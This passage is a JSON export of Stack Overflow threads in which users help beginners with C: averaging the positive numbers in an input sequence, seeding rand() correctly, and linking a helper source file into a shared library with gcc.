"registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 0, "creation_date": 1542149447, "post_id": 53290617, "comment_id": 93463084, "body": "you never break the while loop once you enter it.  &quot;No positine numbers!\\n&quot; spammed forever.  you dont initialize any of your variables when you declare them, so you use squence[num] before its initialized.  but to answer your question, dont add sum += sequence[i] when sequence[i] is &lt;= 0."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1542149733, "post_id": 53290617, "comment_id": 93463157, "body": "Please explain each line of your coding attempt, by adding a comment. It is very unclear what your thinking is. What is the idea of <code>sequence[num] &lt; 0</code>? Where in  your code is anything related to &quot;only positive numbers&quot;?"}], "answers": [{"tags": [], "owner": {"reputation": 43, "user_id": 10111500, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b867ff799ff1ae1c96c4a23709666529?s=128&d=identicon&r=PG&f=1", "display_name": "mSours", "link": "https://stackoverflow.com/users/10111500/msours"}, "is_accepted": false, "score": 1, "last_activity_date": 1542150051, "last_edit_date": 1542150051, "creation_date": 1542149608, "answer_id": 53290716, "question_id": 53290617, "link": "https://stackoverflow.com/questions/53290617/finding-the-average-in-a-sequence-of-number-in-c-while-ignoring-the-negative-num/53290716#53290716", "title": "Finding the Average in a sequence of number in c while ignoring the negative numbers in the sequence", "body": "<p>If you want the average of the positive numbers, you should use a different variable than num for your final avg calculation.</p>\n\n<p>I would do something like this:</p>\n\n<pre><code>    int PositiveNumCount = 0;\n    float avg;   \n    for (i=0; i &lt; num; i++) {\n        scanf(\"%d\", &amp;sequence[i]);\n        if(sequence[i] &gt; 0){ sum += sequence[i]; PositiveNumCount++;}\n    }\n    avg = (float) sum / PositiveNumCount;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542149730, "post_id": 53290732, "comment_id": 93463155, "body": "This will give a wrong average, since you still have to track how many positive numbers you have added"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1542149771, "post_id": 53290732, "comment_id": 93463165, "body": "Would you like to improve this code-only answer by adding some explanation?"}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 0, "creation_date": 1542149777, "post_id": 53290732, "comment_id": 93463166, "body": "From the OPs only question: &quot;Here is my code, I just need help with how to ignore the negative numbers in the input sequence.&quot;  This code is riddled with issues..."}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1542149866, "post_id": 53290732, "comment_id": 93463189, "body": "@Yunnosch I have clarified my response, thank you for the suggestion."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1542149940, "post_id": 53290732, "comment_id": 93463205, "body": "Pointing out shortcomings and giving the shortest possible answer is not the same as a helpful answer and not the explanation to improve the answer either."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1542150001, "post_id": 53290732, "comment_id": 93463216, "body": "By me, for the reasons you mentioned @Yunnosch"}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1542150018, "post_id": 53290732, "comment_id": 93463221, "body": "@Yunnosch well thanks for clarifiying that.  I put the list of issues with the OPs source as the second comment to his question."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542150060, "post_id": 53290732, "comment_id": 93463231, "body": "@ctx Fair is fair. And being open about it deserves respect in my opinion."}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542150088, "post_id": 53290732, "comment_id": 93463241, "body": "@Ctx He asked SPECIFICALLY where he needed help.  he didnt ask SO to finish his homework for him.  My answer is legitimately what the OP was requesting, but feel free to downvote me anyways.  Clearly this is a homework assignment and a learning experience, leaving the other issues in there is beneficial to his debugging efforts so he can LEARN on his own."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1542150220, "post_id": 53290732, "comment_id": 93463277, "body": "Giving only what OP asks for, with little explanation, is not the same as a helpful answer, especially not from point of view of every other future reader."}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 0, "creation_date": 1542150800, "post_id": 53290732, "comment_id": 93463420, "body": "<a href=\"https://stackoverflow.com/help/how-to-answer\">stackoverflow.com/help/how-to-answer</a>  Read the question carefully. What, specifically, is the question asking for? Make sure your answer provides that \u2013 or a viable alternative. The answer can be \u201cdon\u2019t do that\u201d, but it should also include \u201ctry this instead\u201d. Any answer that gets the asker going in the right direction is helpful, but do try to mention any limitations, assumptions or simplifications in your answer. Brevity is acceptable, but fuller explanations are better."}], "tags": [], "owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "is_accepted": false, "score": -1, "last_activity_date": 1542149832, "last_edit_date": 1542149832, "creation_date": 1542149672, "answer_id": 53290732, "question_id": 53290617, "link": "https://stackoverflow.com/questions/53290617/finding-the-average-in-a-sequence-of-number-in-c-while-ignoring-the-negative-num/53290732#53290732", "title": "Finding the Average in a sequence of number in c while ignoring the negative numbers in the sequence", "body": "<pre><code>printf(\"Enter the sequence:\\n\");\nfor (i=0; i &lt; num; i++) {\n    scanf(\"%d\", &amp;sequence[i]);\n    if(sequeunce[i] &gt; 0){ //This if statement is what your looking for, but there are several other problems in your code.  GL!\n        sum += sequence[i];\n    }\n}\n</code></pre>\n\n<p>The above if statement is what the OP was asking for: \"Here is my code, I just need help with how to ignore the negative numbers in the input sequence.\"</p>\n\n<p>There are many issues with his posted code, including using variables before they are initialized and infinite looping paths.  This is the shortest answer to his question.</p>\n"}, {"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 1, "last_activity_date": 1542149932, "creation_date": 1542149932, "answer_id": 53290769, "question_id": 53290617, "link": "https://stackoverflow.com/questions/53290617/finding-the-average-in-a-sequence-of-number-in-c-while-ignoring-the-negative-num/53290769#53290769", "title": "Finding the Average in a sequence of number in c while ignoring the negative numbers in the sequence", "body": "<p>There are multiple problems in your code:</p>\n\n<ul>\n<li><code>sequence[num]</code> may refer to an entry beyond the end of the array which has undefined behavior, and otherwise reads from an uninitalized array, which has undefined behavior too. Just remove this test completely as it is useless.</li>\n<li>you do not need to store the numbers read, just read them ne at a time into a temporary variable and only add and count the positive values.</li>\n<li>you should test the return value of <code>scanf</code> to avoid undefined behavior on invalid input.</li>\n</ul>\n\n<p>Here is a corrected and simplified version:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int num;           // max number of values to read\n    int count = 0;     // number of positive values\n    double sum = 0.0;  // sum if the sequence\n    double avg;        // the average\n\n    printf(\"Enter the number of number in the sequence:\\n\");\n    if (scanf(\"%d\", &amp;num) == 1 &amp;&amp; num &gt; 0) {\n        printf(\"Enter the sequence:\\n\");\n        while (num-- &gt; 0) {\n            int temp;\n            if (scanf(\"%d\", &amp;temp) != 1)\n                break;\n            if (temp &gt;= 0) {\n                sum += temp;\n                count++;\n            }\n        }\n        avg = sum / count;\n        printf(\"Average is %.2f\\n\", avg);\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "is_accepted": false, "score": 2, "last_activity_date": 1542151644, "last_edit_date": 1542151644, "creation_date": 1542150965, "answer_id": 53290911, "question_id": 53290617, "link": "https://stackoverflow.com/questions/53290617/finding-the-average-in-a-sequence-of-number-in-c-while-ignoring-the-negative-num/53290911#53290911", "title": "Finding the Average in a sequence of number in c while ignoring the negative numbers in the sequence", "body": "<p>Here:</p>\n\n<pre><code>while (num &lt; 0 || sequence[num] &lt; 0) {\n</code></pre>\n\n<p>you are testing <code>sequence[num]</code> before you have written any values to the array, and the test of <code>num</code> should be <code>num &lt;= 0</code> since if there are zero values, there are also no positive values.  You can only decide that there are no positive values after you have entered them all.</p>\n\n<p>The array <code>sequence</code> is unnecessary - you can simply accumulate the positive values to <code>sum</code> and discard them, maintaining a count of valid values.  The avoids any buffer overrun issues also.</p>\n\n<p><code>sum</code> is an <code>int</code>, but you have unnecessarily initialised it with a <code>double</code>.</p>\n\n<p>Your average calculation:</p>\n\n<pre><code>avg = (float) sum / num ;\n</code></pre>\n\n<p>is incorrect since <code>num</code> includes negative values - you need a separate count of valid values contributing to the average (unless the intent is to treat all negative values as zero).</p>\n\n<p>Another issue is that you have not validated the input matched the format specifier.</p>\n\n<pre><code>int main()\n{\n    printf(\"Enter the number of number in the sequence:\\n\");\n    int num = 0 ;\n    int check = scanf( \"%d\", &amp;num ) ;\n\n    int positive_count = 0 ;\n    int sum = 0 ;\n    if( check != 0 &amp;&amp; num &gt;= 0 )\n    {\n        printf( \"Enter the sequence:\\n\" ) ;\n\n        int i = 0 ;\n        while( i &lt; num ) \n        {\n            int value = 0 ;\n            check = scanf( \"%d\", &amp;value ) ;\n            if( check != 0 )\n            {\n                i++ ;\n                if( value &gt;= 0 )\n                {\n                    positive_count++ ;\n                    sum += value ;\n                }\n            }\n        }\n    }\n\n    if( positive_count != 0 )\n    {\n        float avg = (float) sum / positive_count ;\n\n        printf( \"Average is %.2f\\n\", avg ) ;\n    }\n    else\n    {\n        printf( \"No positive numbers!\\n\" ) ;\n    }\n\n    return 0 ;\n}\n</code></pre>\n"}], "owner": {"reputation": 19, "user_id": 8044841, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5TqGVxwX5MY/AAAAAAAAAAI/AAAAAAAAAvY/rjq4GDUk3mU/photo.jpg?sz=128", "display_name": "jrl", "link": "https://stackoverflow.com/users/8044841/jrl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2819, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1542151644, "creation_date": 1542148964, "last_edit_date": 1542149240, "question_id": 53290617, "link": "https://stackoverflow.com/questions/53290617/finding-the-average-in-a-sequence-of-number-in-c-while-ignoring-the-negative-num", "title": "Finding the Average in a sequence of number in c while ignoring the negative numbers in the sequence", "body": "<p>I have to write a C program that reads a sequence of integers (positive, negative, or zero) and calculate the average of the <strong>positive integers only</strong>. \nIf there are no positive numbers, you should display the following statement followed by a new line\n<strong>No positive numbers!</strong></p>\n\n<p>Here is my code, I just need help with how to ignore the negative numbers in the input sequence.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint main(){\n\n    int num;  //number of elements\n    int i;\n    int sequence[100];  //numeber if sequence\n    int sum = 0.0;            //sum if the sequence\n    float avg;          // the average\n\n    printf(\"Enter the number of number in the sequence:\\n\");\n    scanf(\"%d\", &amp;num);\n\n    while (num &lt; 0 || sequence[num] &lt; 0) {\n        printf(\"No positine numbers!\\n\");\n    }\n\n    printf(\"Enter the sequence:\\n\");\n    for (i=0; i &lt; num; i++) {\n        scanf(\"%d\", &amp;sequence[i]);\n        sum += sequence[i];\n    }\n\n    avg = (float) sum / num;\n    printf(\"Average is %.2f\\n\", avg);\n    return(0);\n}\n</code></pre>\n"}, {"tags": ["c", "random"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 7, "creation_date": 1542148505, "post_id": 53290513, "comment_id": 93462809, "body": "<code>srand48</code> is not <code>srand</code>. In other words, always check the man pages to make sure you are using the correct function."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 2, "creation_date": 1542148512, "post_id": 53290513, "comment_id": 93462812, "body": "If you don&#39;t seed it, <code>rand()</code> will produce the same sequence every time, yes. You need to call <code>srand()</code> to do that..."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 2, "creation_date": 1542148576, "post_id": 53290513, "comment_id": 93462836, "body": "Use lrand48() instead of rand()"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 6, "creation_date": 1542149214, "post_id": 53290513, "comment_id": 93463008, "body": "In case you&#39;re not understanding the other comments, <code>srand48()</code> seeds the <code>lrand48()</code> function, and <code>srand()</code> seeds the <code>rand()</code> function. You have to use the correct pair of functions together."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1542149285, "post_id": 53290513, "comment_id": 93463036, "body": "Even if you manage to seed your randoms, comparing a double to constant for identity might end up in the &quot;else&quot; branch. Use an integer instead."}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 1, "creation_date": 1542153130, "post_id": 53290513, "comment_id": 93463984, "body": "Also note that with even the best RNG, you&#39;ll have problems with a program that only uses one number; it won&#39;t really be random at all, it will be a hash function of the time. For example, if two users run this program within a second of each other, they&#39;ll get the same answer. Better to use an external randomness source like /dev/random."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1542181924, "post_id": 53290513, "comment_id": 93471527, "body": "@Yunnosch: Comparing floating-point numbers for equality has its pitfalls, but I don&#39;t see a problem here. The possible values of <code>t</code> are 0.0,1.0,2.0,3.0 and 4.0. all of them can be represented exactly and should compare as equal to the respective integers. (But I&#39;m not saying that <code>double</code> is a good choice for the type of &#180;t`.)"}], "answers": [{"comments": [{"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 1, "creation_date": 1542149822, "post_id": 53290702, "comment_id": 93463180, "body": "Nice answer! I will be a bit pedantic: you can call srand with any argument to seed rand function. <code>time(0)</code> is usually used for seed. I had a feeling your answer indicates that only the argument <code>time(0)</code> allows to seed the rand function."}, {"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 1, "creation_date": 1542149913, "post_id": 53290702, "comment_id": 93463201, "body": "@KamilCuk Reworded my answer :)"}], "tags": [], "owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "is_accepted": true, "score": 5, "last_activity_date": 1542149842, "last_edit_date": 1542149842, "creation_date": 1542149502, "answer_id": 53290702, "question_id": 53290513, "link": "https://stackoverflow.com/questions/53290513/rand-not-unique-in-c/53290702#53290702", "title": "Rand() not unique in C", "body": "<p>As others have noted in the comments, the function <code>srand48</code> does not seed <code>rand</code>; it seeds <code>lrand48</code> and related functions. From the <a href=\"https://linux.die.net/man/3/srand48\" rel=\"nofollow noreferrer\">man page</a>:</p>\n\n<blockquote>\n  <p>The srand48(), seed48() and lcong48() functions are initialization functions, one of which should be called before using drand48(), lrand48() or mrand48(). The functions erand48(), nrand48() and jrand48() do not require an initialization function to be called first.</p>\n</blockquote>\n\n<p>You need to call <a href=\"https://linux.die.net/man/3/srand\" rel=\"nofollow noreferrer\"><code>srand</code></a> with the argument <code>time(0)</code> to seed the <code>rand</code> function to the current system time.</p>\n\n<p>Also, why are you using the type <code>double</code> to store the value returned from <code>rand</code>? Use whichever integral type is sufficient to contain <code>RAND_MAX</code> on your system; usually <code>short</code> or <code>int</code>.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user10459058"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 178, "favorite_count": 1, "accepted_answer_id": 53290702, "answer_count": 1, "score": 1, "last_activity_date": 1542149842, "creation_date": 1542148358, "last_edit_date": 1542149142, "question_id": 53290513, "link": "https://stackoverflow.com/questions/53290513/rand-not-unique-in-c", "title": "Rand() not unique in C", "body": "<p>I am using a rand() function to generate a random chocolate. Even though I have seeded the time, rand() always gives me the same number and I'm not sure how to fix it?</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;math.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;time.h&gt;\n\n\nint main() {\n    /* Seed the random number generator */\n    srand48(time(0));\n    double t=rand()%5;\n    printf(\"Your selected chocolate will be: \\n\");\n    if(t==0){\n        printf(\"Caramel\\n\");\n    }\n    else if(t==1){\n        printf(\"Milk\\n\");\n    }\n    else if(t==2){\n        printf(\"Sweet\\n\");\n    }\n    else if(t==3){\n        printf(\"Semi-sweet\\n\");\n    }\n    else {\n        printf(\"Dark\\n\");\n    }\n\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>Thanks!</p>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 1, "creation_date": 1542147642, "post_id": 53290381, "comment_id": 93462511, "body": "Where is the function <code>recursive()</code> defined?"}, {"owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542147664, "post_id": 53290381, "comment_id": 93462522, "body": "@Ctx its defined in recursive.c. Prototyped in recursive.h"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542147690, "post_id": 53290381, "comment_id": 93462531, "body": "Then you will probably have to link recursive.c also into list.so"}, {"owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542147766, "post_id": 53290381, "comment_id": 93462566, "body": "@Ctx I read some answers suggesting the same on the internet. But i dont know how to link a .c"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 1, "creation_date": 1542147787, "post_id": 53290381, "comment_id": 93462578, "body": "<code>gcc -Wall -shared -fPIC -o list.so list.c recursive.c</code>"}, {"owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542147909, "post_id": 53290381, "comment_id": 93462635, "body": "@Ctx if i compile with your command it ignores the .h (there are vital structs there)"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542147945, "post_id": 53290381, "comment_id": 93462643, "body": "Did you forget to include it in <code>recursive.c</code>?"}, {"owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542148068, "post_id": 53290381, "comment_id": 93462681, "body": "@Ctx opps... Indeed i did."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542148094, "post_id": 53290381, "comment_id": 93462693, "body": "Hah! My crystalball is worth its money ;)"}, {"owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542148124, "post_id": 53290381, "comment_id": 93462702, "body": "@Ctx absolutely hahah"}], "answers": [{"tags": [], "owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "is_accepted": false, "score": 2, "last_activity_date": 1542148159, "creation_date": 1542148159, "answer_id": 53290476, "question_id": 53290381, "link": "https://stackoverflow.com/questions/53290381/compile-so-with-h/53290476#53290476", "title": "compile .so with .h", "body": "<p>As suggested by Ctx. The solution was to compile with:</p>\n\n<pre><code>gcc -Wall -shared -fPIC -o list.so list.c recursive.c\n</code></pre>\n"}], "owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 119, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1542148159, "creation_date": 1542147567, "question_id": 53290381, "link": "https://stackoverflow.com/questions/53290381/compile-so-with-h", "title": "compile .so with .h", "body": "<p>I have three files:</p>\n\n<pre><code>list.c, recursive.c, recursive.h\n</code></pre>\n\n<p>the 2nd and third are the header and .c of an auxiliary function called: recursive.</p>\n\n<p>The first one is a file that im trying to compile as a .so. It does an include of recursive.h with:</p>\n\n<p><code>#include \"recursive.h\"</code> </p>\n\n<p>Normally i would compile it with:</p>\n\n<pre><code>gcc -Wall -shared -fPIC -o list.so list.c\n</code></pre>\n\n<p>but whenever i run the code from a client program i get the following:</p>\n\n<pre><code>./shell: symbol lookup error: /home/list.so: undefined symbol: recursive\n</code></pre>\n"}, 